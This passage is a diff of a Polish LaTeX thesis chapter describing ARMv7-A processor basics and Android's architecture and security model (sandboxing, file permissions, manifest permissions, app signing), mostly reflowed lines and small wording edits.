@@ -5,8 +5,14 @@
 \usepackage{todonotes}
 \usepackage{hyperref}
 \usepackage{tikz}
+\usepackage{fancyvrb}
 
 \usepackage[utf8]{inputenc}
+\usepackage{float}
+
+\floatstyle{ruled}
+\newfloat{print}{tb}{lop}[section]
+\floatname{print}{Wydruk}
 
 \usetikzlibrary{arrows,positioning} 
 \tikzset{
@@ -15,7 +21,7 @@
     %Define style for boxes
     punkt/.style={
            rectangle,
-           rounded corners,
+%           rounded corners,
            draw=black, very thick,
            text width=6.5em,
            minimum height=2em,
@@ -109,72 +115,74 @@ krótkie streszczenie pracy
 
 \chapter{Platforma sprzętowa i programowa}
 
-Android jest systemem operacyjnym i zestawem aplikacji dedykowanym przede wszystkim dla urządzeń przenośnych z ekranami dotykowymi, takimi jak np. smartfon, tablet. 
-Jądro systemu zostało oparte na jądrze Linuksa. System ten został zaprojektowany i stworzony głównie z myślą o urządzeniach
+Android jest systemem operacyjnym i zestawem aplikacji dedykowanym przede wszystkim dla urządzeń przenośnych z ekranami dotykowymi, takimi jak 
+np. smartfon, tablet. Jądro systemu zostało oparte na jądrze Linuksa. System ten został zaprojektowany i stworzony głównie z myślą o urządzeniach
 wyposażonych w procesor w architekturze ARM, aczkolwiek podejmowane są prace nad dostosowaniem Androida do innych architektur, np. x86.
 
 W rozdziale tym zostaną opisane podstawy architektury procesorów ARM. Następnie zostanie omówiona architektura oraz model bezpieczeństwa systemu Android.
 
 \section{Architektura procesorów ARM}
 
-ARM jest 32-bitową architekturą typu RISC. Z biegiem czasu ukazywały się kolejne jej wersje. Niniejsza praca bazuje na wersji \verb+ARMv7-A+, która została zrealizowana m.in.
-w procesorach z serii \verb+Cortex-A+ powszechnie wykorzystywanych w nowoczesnych urządzeniach przenośnych. Główne jej cechy to:
+ARM jest obecnie najczęściej stosowaną architekturą procesorów typu RISC. Z biegiem czasu ukazywały się kolejne jej wersje. Niniejsza 
+praca bazuje na 32-bitowej wersji architektury ARMv7-A, która została zrealizowana m.in. w procesorach z serii Cortex-A powszechnie 
+wykorzystywanych w nowoczesnych urządzeniach przenośnych. Główne jej cechy to:
 \begin{itemize}
-\item dwa zestawy instrukcji: \verb+ARM+ (nazywany także \verb+A32+) oraz \verb+Thumb-2+,
-\item architektura typu \emph{load/store} - operacje wykonywane są na rejestrach a nie bezpośrednio na pamięci,
+\item dwa zestawy instrukcji: ARM (nazywany także A32) oraz Thumb-2,
+\item architektura typu \emph{load/store} -- operacje arytmetyczno-logiczne wykonywane są tylko na~rejestrach, a nie bezpośrednio na pamięci,
 \item szesnaście 32-bitowych rejestrów,
 \item większość instrukcji wykonywanych w jednym cyklu zegara.
 \end{itemize}
 
 \subsection{Thumb-2}
 
-W podstawowym zestawie instrukcji ARM rozkazy są stałej, 32-bitowej długości. W celu zwiększenia gęstości kodu został wprowadzony drugi, uproszczony zestaw Thumb, 
-rozszerzony następnie przez technologię Thumb-2. Instrukcje w tym zestawie są zmiennej długości (16- i 32-bitowe). Ponieważ w obydwu trybach adresy instrukcji 
-muszą być odpowiednio wyrównane, ostatni bit adresu instrukcji ma zawsze wartość 0. Wykorzystuje się to w celu zmiany trybu pracy procesora. Instrukcja skoku do adresu, 
-którego ostatni bit jest równy 1, wymusza zmianę trybu na Thumb-2 i dalsze wykonywanie instrukcji spod adresu odpowiednio wyrównanego. Analogicznie instrukcja skoku 
-do parzystego adresu powoduje przejście w 32-bitowy zestaw instrukcji ARM.
+W podstawowym zestawie instrukcji ARM rozkazy są stałej, 32-bitowej długości. W celu zwiększenia gęstości kodu został wprowadzony drugi, uproszczony 
+zestaw Thumb, w którym rozkazy są też stałej, 16-bitowej długości. Został on następnie rozszerzony do zestawu Thumb-2, w którym instrukcje są zmiennej 
+długości (16- i 32-bitowe). Ponieważ we wszystkich trybach adresy instrukcji muszą być odpowiednio wyrównane, 
+ostatni bit adresu instrukcji ma zawsze wartość 0. Wykorzystuje się to w celu zmiany trybu pracy procesora. Instrukcja skoku do~adresu, 
+którego ostatni bit jest równy 1, wymusza zmianę trybu na Thumb-2 i dalsze wykonywanie instrukcji spod adresu odpowiednio wyrównanego. 
+Instrukcja skoku do~parzystego adresu powoduje przejście do 32-bitowego zestawu instrukcji ARM.
 
 \subsection{Rejestry}
 
-Z punktu widzenia programisty dostępnych jest szesnaście 32-bitowych rejestrów R0--R15. Trzy z nich mają dedykowane przeznaczenie:
+Z punktu widzenia programisty dostępnych jest szesnaście 32-bitowych rejestrów R0~--~R15. Trzy z nich mają dedykowane przeznaczenie:
 
 \begin{itemize}
-\item \verb+SP+ (ang. \textit{Stack Pointer}) -- R13 -- wskaźnik stosu,
-\item \verb+LR+ (ang. \textit{Link Register}) -- R14 -- adres powrotu z podprogramu,
-\item \verb+PC+ (ang. \textit{Program Counter}) -- R15 -- adres następnej instrukcji.
+\item SP (ang. \textit{Stack Pointer}) -- R13 -- wskaźnik stosu,
+\item LR (ang. \textit{Link Register}) -- R14 -- adres powrotu z podprogramu,
+\item PC (ang. \textit{Program Counter}) -- R15 -- adres następnej instrukcji.
 \end{itemize}
 
-Dodatkowo występuje rejestr statusu procesora CPSR (ang. \textit{Current Processor Status Register}). Przechowuje on m.in. znaczniki Negative, Zero, Carry, oVerflow.
-Większość instrukcji podstawowego zestawu może być wykonywanych warunkowo, w zależności od stanu tych znaczników. Szczegółowe informacje na ten temat można znaleźć w \cite{armman}.
+Dodatkowo występuje rejestr statusu procesora CPSR (ang. \textit{Current Processor Status Register}). Przechowuje on m.in. znaczniki Negative, Zero, 
+Carry, oVerflow. Większość instrukcji podstawowego zestawu może być wykonywanych warunkowo, w zależności od stanu tych znaczników. Szczegółowe 
+informacje na ten temat można znaleźć w \cite{armman}.
 
 \subsection{Standard wywołania podprogramów}
 
-ABI (ang. Application binary interface) jest to zbiór reguł i konwencji, które określają sposób wywoływania podprogramów, przekazywania im argumentów oraz odbierania zwracanej wartości, 
-a także format plików binarnych. Kompletną dokumentację ABI dla architektury ARM można znaleźć w \cite{armcall}. Zdefiniowane są następujące zasady wywoływania
-podprogramów (procedur i funkcji):
+Zbiór reguł i konwencji, które określają sposób wywoływania podprogramów, przekazywania im argumentów oraz odbierania zwracanej wartości, 
+a także format plików binarnych nazywa się ABI (ang. Application Binary Interface). Kompletną dokumentację ABI dla architektury ARM można 
+znaleźć w \cite{armcall}. Zdefiniowano w niej następujące zasady wywoływania podprogramów (procedur i funkcji):
 \begin{itemize}
-\item Do przekazywania argumentów i zwracania wyniku funkcji używane są rejestry R0--R3. Kolejne argumenty mogą być przekazywane na stosie.
-\item Wartości rejestrów R0--R3 i R12 mogą być dowolnie modyfikowane trakcie wykonania podprogramu.
-\item Zawartość rejestrów R4--R11, LR, SP musi być przywrócona do wartości sprzed wywołania podprogramu. Zazwyczaj w prologu rejestry te są odkładana na stos, 
-aby przywrócić ich wartości w epilogu.
+\item Do przekazywania argumentów i zwracania wyniku funkcji używane są rejestry R0~--~R3. Kolejne argumenty mogą być przekazywane na stosie.
+\item Wartości rejestrów R0~--~R3 i R12 mogą być dowolnie modyfikowane w trakcie wykonania podprogramu.
+\item Zawartość rejestrów R4~--~R11, LR, SP musi być przywrócona do wartości sprzed wywołania podprogramu. Zazwyczaj w prologu rejestry te 
+odkłada się na stos, aby przywrócić ich wartości w epilogu.
 \item Stos rośnie w kierunku mniejszych adresów pamięci.
 \end{itemize}
 
 Wykonywanie podprogramów umożliwiają następujące instrukcje skoku:
 \begin{itemize}
-\item \verb+B+ -- ang. \textit{Branch},
-\item \verb+BL+ -- ang. \textit{Branch with Link},
-\item \verb+BX+ -- ang. \textit{Branch and Exchange},
-\item \verb+BLX+ -- ang \textit{Branch with Link and Exchange}.
+\item \verb+B+ (ang. \textit{Branch}) -- skok względny,
+\item \verb+BL+ (ang. \textit{Branch with Link}) -- skok względny, wywołanie podprogramu,
+\item \verb+BX+ (ang. \textit{Branch and Exchange}) -- skok pośredni,
+\item \verb+BLX+ (ang. \textit{Branch with Link and Exchange}) -- skok pośredni, wywołanie podprogramu.
 \end{itemize}
 
-Instrukcja \textit{Branch} umożliwia wykonanie skoku o maksymalnie 32 MiB w przód lub w tył od bieżącej instrukcji. \textit{Branch with link} dodatkowo
-zachowuje adres powrotu w rejestrze LR (R14). Pozostałe dwie instrukcje jako argument przyjmują rejestr -- skok jest wykonywany do adresu, jaki znajduje się
+Instrukcja \verb+B+ umożliwia wykonanie skoku o maksymalnie 32 MiB w przód lub w tył od~bieżącej wartości licznika instrukcji. Instrukcja \verb+BL+
+dodatkowo zachowuje adres powrotu (adres następnej instrukcji) w rejestrze LR (R14). Pozostałe dwie instrukcje jako argument przyjmują rejestr~--~
+skok jest wykonywany do adresu, jaki znajduje się
 w przekazanym rejestrze.
 
 \section{Architektura systemu Android}
-
-% http://www.android-app-market.com/android-architecture.html
 
 Rysunek \ref{figure:architektura} przedstawia najważniejsze komponenty systemu Android. Zostaną one w skrócie omówione w kolejnych punktach.
 
@@ -188,31 +196,34 @@ Rysunek \ref{figure:architektura} przedstawia najważniejsze komponenty systemu 
 
 \subsection{Jądro systemu}
 
-Podstawową warstwą zapewniającą interakcje ze sprzętem jest jądro systemu. Jądro systemu Android od wersji 4.0 (\textit{Ice Cream Sandwich}) jest nieznacznie 
-zmodyfikowanym jądrem Linuxa w wersji 3.0.x. Wcześniejsze wydania systemu opierały się na jądrach z linii 2.6.x. Najważniejsze zmiany w stosunku do głównej wersji to:
+Podstawową warstwą zapewniającą interakcje ze sprzętem jest jądro systemu. Jądro systemu Android od wersji 4.0 (\textit{Ice Cream Sandwich}) jest 
+nieznacznie zmodyfikowanym jądrem Linuxa w wersji 3.0.x. Wcześniejsze wydania systemu opierały się na jądrach z linii 2.6.x. Najważniejsze zmiany 
+w stosunku do głównej wersji to:
 \begin{itemize}
 \item dodatkowe mechanizmy komunikacji międzyprocesowej i zdalnego wołania metod (ang. \textit{Android Binder}),
 \item nowy podsystemem pamięci dzielonej \verb+ashmem+ i alokator pamięci \verb+pmem+,
-\item \verb+logger+ - wsparcie jądra dla narzędzia \verb+logcat+,
+\item \verb+logger+ -- wsparcie jądra dla narzędzia \verb+logcat+,
 \item dodatkowe mechanizmy ograniczające dostęp do wybranych funkcjonalności sieciowych (ang. \textit{paranoid network security}).
 \end{itemize}
 
-Sytuacja, w której jądro Androida jest rozgałęzieniem w stosunku do głównej linii Linuxa, jest bardzo istotna z punktu widzenia bezpieczeństwa systemu. Wszelkie zmiany
-wprowadzane w jądrze Linuxa, w tym niektóre poprawki bezpieczeństwa, pojawiają się w zmodyfikowanej wersji dla Androida ze sporym opóźnieniem. Dodatkowo opóźnienie to 
-jest powiększone przez system aktualizacji systemu, co zostanie opisane w punkcie \ref{section:aktualizacje}.
-Z tego powodu istnieje bardzo wiele powszechnie znanych luk w jądrze Androida, pozwalających m.in. na eskalację uprawnień procesu. Pozwala to na tymczasowe lub permanentne 
-uzyskanie uprawnień administratora systemu (tzw. ,,rootowanie'' systemu). Jest to bardzo często wykorzystywane przez zwykłych użytkowników do wykonania niektórych czynności 
-administracyjnych, np. zmiany konfiguracji systemu, odinstalowania wybranych aplikacji systemowych, a nawet wgrania zupełnie nowego obrazu systemu. Istnieje wiele narzędzi 
-umożliwiających wykonanie tego procesu zwykłemu, niezaawansowanemu użytkownikowi.
+Sytuacja, w której jądro Androida jest rozgałęzieniem w stosunku do głównej linii Linuxa, jest bardzo istotna z punktu widzenia bezpieczeństwa systemu. 
+Wszelkie zmiany wprowadzane w jądrze Linuxa, w tym niektóre poprawki bezpieczeństwa, pojawiają się w zmodyfikowanej wersji dla Androida ze sporym 
+opóźnieniem. Dodatkowo opóźnienie to jest powiększone przez sposób aktualizacji systemu, co zostanie opisane w punkcie \ref{section:aktualizacje}.
+Z tego powodu istnieje bardzo wiele powszechnie znanych luk w jądrze Androida, pozwalających m.in. na eskalację uprawnień procesu. Dzięki temu 
+możliwe jest tymczasowe lub permanentne uzyskanie uprawnień administratora systemu (tzw. ,,rootowanie'' systemu). Jest to bardzo często wykorzystywane 
+przez zwykłych użytkowników do wykonania niektórych czynności administracyjnych, np. zmiany konfiguracji systemu, odinstalowania wybranych aplikacji 
+systemowych, a nawet wgrania zupełnie nowego obrazu systemu. Istnieje wiele narzędzi umożliwiających wykonanie tego procesu zwykłemu, niezaawansowanemu 
+użytkownikowi.
 
 \subsection{Biblioteki}
 
-System Android wyposażono w szereg popularnych bibliotek napisanych w C/C++, używanych przez różne komponenty poprzez framework aplikacji. Możliwe jest także skorzystanie 
-z tych bibliotek w kodzie natywnym napisanym w C/C++. Przykładowe biblioteki to:
+System Android wyposażono w szereg popularnych bibliotek napisanych w C/C++, używanych przez różne komponenty poprzez framework aplikacji. Możliwe jest 
+także skorzystanie z tych bibliotek w kodzie natywnym napisanym w C/C++. Przykładowe biblioteki to:
 
 \begin{itemize}
 \item \verb+libc+ -- standardowa biblioteka C, zoptymalizowana dla urządzeń wbudowanych,
-\item \verb+webcore+ -- silnik przeglądarki internetowej, wykorzystany też w innych aplikacjach, które potrzebują wyświetlić stronę HTML, np. w kliencie poczty e-mail,
+\item \verb+webcore+ -- silnik przeglądarki internetowej, wykorzystany też w innych aplikacjach, które potrzebują wyświetlić stronę HTML, np. 
+w kliencie poczty e-mail,
 \item \verb+sqllite+ -- lekka, relacyjna baza danych,
 \item \verb+OpenGL+ -- biblioteka graficzna używana podczas renderowania grafiki dwu- i trójwymiarowej,
 \item zestaw bibliotek multimedialnych dostarczających kodeki wybranych formatów plików.
@@ -222,17 +233,18 @@ z tych bibliotek w kodzie natywnym napisanym w C/C++. Przykładowe biblioteki to
 
 Środowisko czasu wykonania systemu Android składa się z maszyny wirtualnej Dalvik oraz podstawowych bibliotek Javy.
 
-Dalvik jest maszyną wirtualną, która została stworzona specjalnie dla systemu Android, w celu zapewnienia odpowiedniej wydajności na urządzeniach z mniejszymi
-zasobami, jak np. telefony komórkowe. Dalvik nie jest maszyną wirtualną Javy i używa własnego kodu bajtowego w formacie \verb+.dex+ (ang. \textit{Dalvik executable}). Możliwa jest 
-jednak konwersja kodu bajtowego Javy do kodu Dalvika. W przeciwieństwie do wirtualnej maszyny Javy, która jest maszyną stosową, Dalvik jest maszyną rejetrową.
-Dalvik umożliwia uruchomienie wielu aplikacji jednocześnie, wydajnie tworząc klika instancji maszyny wirtualnej. Zapewnia izolację procesów, zarządzanie pamięcią oraz wielowątkowość. 
+Dalvik jest maszyną wirtualną, która została stworzona specjalnie dla systemu Android, w celu zapewnienia odpowiedniej wydajności na urządzeniach 
+z mniejszymi zasobami, jak np. telefony komórkowe. Dalvik nie jest maszyną wirtualną Javy i używa własnego kodu bajtowego w formacie \verb+.dex+ 
+(ang. \textit{Dalvik executable}). Możliwa jest jednak konwersja kodu bajtowego Javy do kodu Dalvika. W przeciwieństwie do wirtualnej maszyny Javy, 
+która jest maszyną stosową, Dalvik jest maszyną rejetrową. Dalvik umożliwia uruchomienie wielu aplikacji jednocześnie, wydajnie tworząc klika instancji 
+maszyny wirtualnej. Zapewnia izolację procesów, zarządzanie pamięcią oraz wielowątkowość. 
 
 \subsection{Aplikacje}
 
-System Android posiada kilka podstawowych aplikacji zapewniających podstawowe funkcjonalności nowoczesnego telefonu komórkowego, np. klient SMS, aplikacja 
-do wykonywania połączeń głosowych, klient poczty, przeglądarka internetowa, zarządca aplikacji. Bardzo wiele funkcjonalności jest wydzielonych do osobnych komponentów, tworząc
-framework. Jest on zaprojektowany w sposób, który umożliwia zastąpienie jego dowolnego komponentu na inny zapewniający taką samą funkcjonalność.
-
+System Android posiada kilka podstawowych aplikacji zapewniających podstawowe funkcjonalności nowoczesnego telefonu komórkowego, np. klient SMS, 
+aplikacja do wykonywania połączeń głosowych, klient poczty, przeglądarka internetowa, zarządca aplikacji. Bardzo wiele funkcjonalności jest wydzielonych 
+do osobnych komponentów, tworząc framework. Jest on zaprojektowany w sposób, który umożliwia zastąpienie jego dowolnego komponentu na inny zapewniający 
+taką samą funkcjonalność.
 
 \section{Model bezpieczeństwa Androida}
 
@@ -246,119 +258,121 @@ kryptografii z kluczem publicznym, jednak ten mechanizm umożliwia jedynie wiary
 System Android zbudowany jest na bazie standardowego jądra Linuxa z nieznacznymi modyfikacjami, dlatego też 
 posiada uznaniową kontrolę dostępu (ang. \textit{Discretionary Access Control}) na poziomie systemu plików, która opiera się na identyfikatorach 
 użytkowników (\textit{uid}) i grup (\textit{gid}). Nad jądrem Android używa własnego zbioru bibliotek i usług. Aplikacje mogą być tworzone w Javie
-i są kompilowane do kodu bajtowego maszyny wirtualnej Dalvik. Aplikacje lub ich fragmenty mogą być również tworzone w C/C++, a następnie wywoływane z Javy
-poprzez interfejs JNI (ang. \textit{Java Native Interface}).
+i są wtedy kompilowane do kodu bajtowego maszyny wirtualnej Dalvik. Aplikacje lub ich fragmenty mogą być również tworzone w C/C++, a następnie 
+wywoływane z Javy poprzez interfejs JNI (ang. \textit{Java Native Interface}).
 
 \subsection{Uruchamianie aplikacji w ,,piaskownicy''}\label{subsection:piaskownica}
 
 Aplikacje zainstalowane w systemie są ograniczone w ,,piaskownicy'', która jest zdefiniowana poprzez unikalny \textit{uid} i odpowiedni \textit{gid}.
-Identyfikatory te są tworzone dynamicznie podczas instalowania aplikacji. Nazwy użytkownika i grupy są identyczne i składają się z prefiksu \verb+app_+ oraz identyfikatora.
-Każda aplikacja używa innego identyfikatora użytkownika i grupy, co gwarantuje pełną izolację na poziomie systemu plików. Dostęp do plików systemowych jest 
-także znacząco ograniczony, zazwyczaj tylko do odczytu. Wywołanie funkcji lub usługi spoza piaskownicy jest możliwe poprzez odpowiednie API, które 
-wymaga odpowiednich uprawnień aplikacji, co zostanie opisanie w punkcie \ref{subsection:uprawnienia}.
+Identyfikatory te są tworzone dynamicznie podczas instalowania aplikacji. Nazwy użytkownika i grupy są identyczne i składają się z prefiksu \verb+app_+
+oraz identyfikatora. Każda aplikacja używa innego identyfikatora użytkownika i grupy, co gwarantuje pełną izolację na poziomie systemu plików. Dostęp
+do plików systemowych jest także znacząco ograniczony, zazwyczaj tylko do odczytu. Wywołanie funkcji lub usługi spoza piaskownicy jest możliwe poprzez
+odpowiednie API, które wymaga odpowiednich uprawnień aplikacji, co zostanie opisanie w punkcie \ref{subsection:uprawnienia}.
 
-Ograniczenia piaskownicy są wymuszane przez jądro systemu i poprzez odpowiednie usługi przestrzeni użytkownika, dlatego też dotyczą wszystkich aplikacji, 
-włącznie z kodem natywnym wywoływanym bezpośrednio poprzez interfejs JNI lub przy użyciu wywołania systemowego \verb+exec+. Jeżeli aplikacje potrzebują współdzielić dane, 
-na przykład na poziomie systemu plików, powinny zadeklarować wspólny identyfikator użytkownika (\textit{uid}) w manifeście. Jest to możliwe tylko wtedy, gdy aplikacje 
-są podpisane przy użyciu tego samego klucza prywatnego. Identyfikatory użytkowników i przydzielone im uprawnienia są przechowywane w pliku \verb+data/system/packages.xml+
-i są do odczytu przez wszystkie aplikacje zainstalowane na urządzeniu.
+Ograniczenia piaskownicy są wymuszane przez jądro systemu i poprzez odpowiednie usługi przestrzeni użytkownika, dlatego też dotyczą wszystkich aplikacji,
+włącznie z kodem natywnym wywoływanym bezpośrednio poprzez interfejs JNI lub przy użyciu wywołania systemowego \verb+exec+. Jeżeli aplikacje potrzebują 
+współdzielić dane, na przykład na poziomie systemu plików, powinny zadeklarować wspólny identyfikator użytkownika (\textit{uid}) w manifeście. Jest to 
+możliwe tylko wtedy, gdy aplikacje są podpisane przy użyciu tego samego klucza prywatnego. Identyfikatory użytkowników i przydzielone im uprawnienia są 
+przechowywane w pliku \verb+data/system/packages.xml+ i mogą być odczytywane przez wszystkie aplikacje zainstalowane na urządzeniu.
 
 \subsection{Kontrola dostępu do systemu plików}
 
-Uznaniowa kontrola dostępu do systemu plików w Androidzie jest zrealizowana przy użyciu tradycyjnych Unixowych uprawnień. Pliki tworzone przez aplikacje domyślnie mają
-ustawione uprawnienia na \verb+rw-rw----+ (0660 w notacji ósemkowej). Z tego powodu aplikacje zainstalowane z różnymi identyfikatorami użytkownika i grupy nie mogą czytać,
-modyfikować ani wykonywać wzajemnie swoich plików. Pliki mogą być jednak jawnie udostępniane poprzez użycie flag \verb+MODE_WORLD_READABLE+ i \verb+MODE_WORLD_WRITABLE+
-podczas tworzenia ich w API Javy lub poprzez wywołanie systemowe \verb+chmod+ w natywnym kodzie C/C++. Tworzenie plików z odpowiednimi uprawnieniami leży w gestii
-aplikacji.
+Uznaniowa kontrola dostępu do systemu plików w Androidzie jest zrealizowana przy użyciu tradycyjnych unixowych uprawnień. Pliki tworzone przez 
+aplikacje domyślnie mają ustawione uprawnienia na \verb+rw-rw----+ (0660 w notacji ósemkowej). Z tego powodu aplikacje zainstalowane z różnymi 
+identyfikatorami użytkownika i grupy nie mogą czytać, modyfikować ani wykonywać wzajemnie swoich plików. Pliki mogą być jednak jawnie udostępniane 
+poprzez użycie flag \verb+MODE_WORLD_READABLE+ i \verb+MODE_WORLD_WRITABLE+ podczas tworzenia ich w API Javy lub poprzez wywołanie systemowe 
+\verb+chmod+ w natywnym kodzie C/C++. Tworzenie plików z odpowiednimi uprawnieniami leży w gestii aplikacji.
 
-Katalog z danymi aplikacji domyślnie znajduje się w \verb+/data/data/<nazwa pakietu>/+ i posiada następującą strukturę:
+Katalog z danymi aplikacji domyślnie znajduje się w \verb+/data/data/<nazwa pakietu>/+ i~posiada następującą strukturę:
 \begin{itemize}
 \item \verb+databases+ -- służy do przechowywania baz danych sqlite,
-\item \verb+lib+ -- zawiera wszystkie natywne biblioteki używane przez aplikacje, skopiowane podczas instalacji,
+\item \verb+lib+ -- zawiera wszystkie natywne biblioteki używane przez aplikację, skopiowane podczas instalacji,
 \item \verb+files+ -- katalog, gdzie domyślnie są tworzone pliki przez aplikację,
 \item \verb+shared_prefs+ -- zawiera XML-owe pliki konfiguracyjne aplikacji.
 \end{itemize}
 
-Standardowe, preinstalowane aplikacje (np. \verb+com.android.camera+) zazwyczaj także używają powyższej struktury katalogów, jednak ich lokalizacja może być odmienna
-na niektórych urządzeniach, np. telefony marki Samsung używają dla preinstalowanych aplikacji ścieżki \verb+/dbdata/databases/<nazwa pakietu>/+. Jest to istotne 
-z punktu widzenia twórcy exploitów, aby złośliwy kod potrafił się dostosować do struktury katalogów używanej przez dane urządzenie.
+Standardowe, preinstalowane aplikacje (np. \verb+com.android.camera+) zazwyczaj także używają powyższej struktury katalogów, jednak ich lokalizacja 
+może być odmienna na niektórych urządzeniach, np. telefony marki Samsung używają dla preinstalowanych aplikacji ścieżki 
+\verb+/dbdata/databases/<nazwa pakietu>/+. Jest to istotne z punktu widzenia twórcy exploitów, gdyż złośliwy kod musi się dostosować do struktury 
+katalogów używanej przez dane urządzenie.
 
-W trakcie rozruchu systemu różne części systemu plików są montowane z odmiennymi opcjami. Katalog \verb+/data+ używa opcji \verb+'rw,nosuid,nodev,relatime'+, co m.in. 
-oznacza, że flaga plików \verb+setuid+ nie będzie respektowana. Pliki wykonywalne będą zawsze uruchamiane z uprawnieniami użytkownika wykonującego program, a nie właściciela pliku.
+W trakcie rozruchu systemu różne części systemu plików są montowane z odmiennymi opcjami. Katalog \verb+/data+ używa opcji 
+\verb+'rw,nosuid,nodev,relatime'+, co m.in. oznacza, że flaga plików \verb+setuid+ nie będzie respektowana. Pliki wykonywalne będą zawsze uruchamiane 
+z uprawnieniami użytkownika wykonującego program, a nie właściciela pliku.
 
-
-Katalog \verb+/system+ jest montowany z opcjami \verb+ro,relatime+, co powoduje, że cała partycja jest jedynie do odczytu. Warto zwrócić uwagę, że w tym przypadku opcja \verb+nosuid+
-nie jest używana, ponieważ system Android korzysta z plików z flagą \verb+setuid+ w tej lokalizacji.
+Katalog \verb+/system+ jest montowany z opcjami \verb+ro,relatime+, co powoduje, że cała partycja jest jedynie do odczytu. Warto zwrócić uwagę, że 
+w tym przypadku opcja \verb+nosuid+ nie jest używana, ponieważ system Android korzysta z plików z flagą \verb+setuid+ w tej lokalizacji.
 
 \subsection{Uprawnienia aplikacji}\label{subsection:uprawnienia}
 
-Aplikacje w celu wyjścia z piaskownicy (zarówno na poziomie systemu pików, jak i wywoływania chronionych funkcji API systemu), muszą mieć wcześniej nadane 
-odpowiednie uprawnienia. Wymagany przez aplikację zestaw uprawnień jest wyświetlany w trakcie instalacji i musi być zaakceptowany przez użytkownika w całości albo wcale.
-Użytkownik nie może zatwierdzić jedynie części z wymaganych przez aplikację uprawnień.
+Aplikacje w celu wyjścia z piaskownicy (zarówno na poziomie systemu pików, jak i wywoływania chronionych funkcji API systemu) muszą mieć wcześniej
+nadane odpowiednie uprawnienia. Wymagany przez aplikację zestaw uprawnień jest wyświetlany w trakcie instalacji i musi być zaakceptowany przez 
+użytkownika w całości albo wcale. Użytkownik nie może zatwierdzić jedynie części z wymaganych przez aplikację uprawnień.
 
-Każda aplikacja musi mieć plik \verb+AndroidManifest.xml+ w swoim głównym katalogu. Plik ten dostarcza systemowi operacyjnemu kluczowych informacji na temat aplikacji.
-W pliku tym deklarowane są uprawnienia, jakich potrzebuje aplikacja do poprawnego działania. Przykładowy wpis:
-
+Każda aplikacja musi mieć plik \verb+AndroidManifest.xml+ w swoim głównym katalogu. Plik ten dostarcza systemowi operacyjnemu kluczowych informacji 
+na temat aplikacji. W pliku tym deklarowane są uprawnienia, jakich potrzebuje aplikacja do poprawnego działania. Przykładowy wpis
 \begin{verbatim}
 <uses-permission android:name="android.permission.CALL_PHONE" />
 \end{verbatim}
-
-\noindent pozwala aplikacji na wykonywanie połączeń telefonicznych. Próba wykonania chronionej funkcji API bez odpowiednich uprawnień spowoduje podniesienie wyjątku \verb+SecurityException+.
+pozwala aplikacji na wykonywanie połączeń telefonicznych. Próba wykonania chronionej funkcji API bez odpowiednich uprawnień spowoduje podniesienie 
+wyjątku \verb+SecurityException+.
 
 \subsection{Podpisywanie aplikacji}
 
-Każda instalowana aplikacja w systemie Android musi być podpisana przez twórcę przy użyciu jego klucza prywatnego wraz z odpowiednim certyfikatem. Możliwe jest jednak używanie
-kluczy prywatnych potwierdzonych przez dowolne centrum certyfikacji, a także certyfikatów samopodpisanych. Mechanizm podpisywania aplikacji nie ma większego znaczenia
-z punktu widzenia bezpieczeństwa systemu. Jedyną korzyścią, jaką wnosi, jest potwierdzenie tożsamości autora instalowanej aplikacji. W przyszłości system podpisywania
-może zostać wykorzystany w celu ograniczenia dostawców aplikacji do jedynie uprzednio zweryfikowanych, podobnie jak to jest w przypadku konkurencyjnego iPhone'a firmy Apple.
-W obecnych wydaniach systemu Android funkcjonalność taka nie jest zaimplementowana.
+Każda instalowana aplikacja w systemie Android musi być podpisana przez twórcę przy użyciu jego klucza prywatnego wraz z odpowiednim certyfikatem. 
+Możliwe jest jednak używanie kluczy prywatnych potwierdzonych przez dowolne centrum certyfikacji, a także certyfikatów samopodpisanych. Mechanizm 
+podpisywania aplikacji nie ma większego znaczenia z punktu widzenia bezpieczeństwa systemu. Jedyną korzyścią, jaką wnosi, jest potwierdzenie tożsamości 
+autora instalowanej aplikacji. W przyszłości system podpisywania może zostać wykorzystany w celu ograniczenia dostawców aplikacji do jedynie uprzednio 
+zweryfikowanych, podobnie jak to jest w przypadku konkurencyjnego iPhone'a firmy Apple. W obecnych wydaniach systemu Android funkcjonalność taka nie 
+jest zaimplementowana.
 
 Mechanizm podpisywanie aplikacji umożliwia programom współdzielenie zasobów, co zostało opisane w punkcie \ref{subsection:piaskownica}
 
 \section{Narzędzia programistyczne}
 
-Twórcy systemu Android udostępnili bardzo dobre narzędzia niezbędne do rozwijania i testowania aplikacji na ten system: SDK (ang. \textit{Software Development Kit})
-i NDK (ang. \textit{Native Development Kit}).
+Twórcy systemu Android udostępnili bardzo dobre narzędzia niezbędne do rozwijania i testowania aplikacji na ten system: SDK (ang. \textit{Software
+Development Kit}) i NDK (ang. \textit{Native Development Kit}).
 
-Android SDK jest podstawowym zestawem narzędzi przydatnym dla bardziej zaawansowanych użytkowników systemu oraz programistów . Najważniejsze komponenty tego pakietu to:
+Android SDK jest podstawowym zestawem narzędzi przydatnym dla bardziej zaawansowanych użytkowników systemu oraz programistów . Najważniejsze komponenty 
+tego pakietu to:
 \begin{itemize}
 \item Emulator wraz z zestawem obrazów kolejnych wersji systemu pozwalający uruchomić wirtualny obraz systemu. Możliwe jest zdefiniowanie 
 sprzętowych parametrów emulowanego obrazu, m.in. rozmiar pamięci RAM, rozdzielczość i typ ekranu. Dzięki temu można wykonywać testy na wielu 
 konfiguracjach. Wirtualizacja opiera się na emulatorze QEMU.
-\item \verb+adb+ (ang. \textit{Android Debug Bridge}) - narzędzie umożliwiające komunikację z urządzeniem i debugowanie aplikacji. Pozwala wykonywać szereg czynności 
-diagnostycznych, np. przesłanie pliku z lub do urządzenia, wypisanie logów systemowych, uruchomienie konsoli, zainstalowanie lub odinstalowanie aplikacji.
-Narzędzie to może być także wykorzystywane do pracy z uruchomionym wirtualnym obrazem.
-\item biblioteki dla kolejnych wydań systemu umożliwiające tworzenie aplikacji na daną platformę
+\item \verb+ADB+ (ang. \textit{Android Debug Bridge}) -- narzędzie umożliwiające komunikację z urządzeniem i debugowanie aplikacji. Pozwala wykonywać 
+szereg czynności diagnostycznych, np. przesłanie pliku z lub do urządzenia, wypisanie logów systemowych, uruchomienie konsoli, zainstalowanie lub 
+odinstalowanie aplikacji. Narzędzie to może być także wykorzystywane do pracy z uruchomionym wirtualnym obrazem.
+\item Biblioteki dla kolejnych wydań systemu umożliwiające tworzenie aplikacji na daną platformę.
 \end{itemize}
 
-Android NDK jest zestawem narzędzi dedykowanych dla systemu Android, który  został stworzony, aby umożliwić tworzenie aplikacji lub ich części w C/C++. 
-W jego skład wchodzą między innymi:
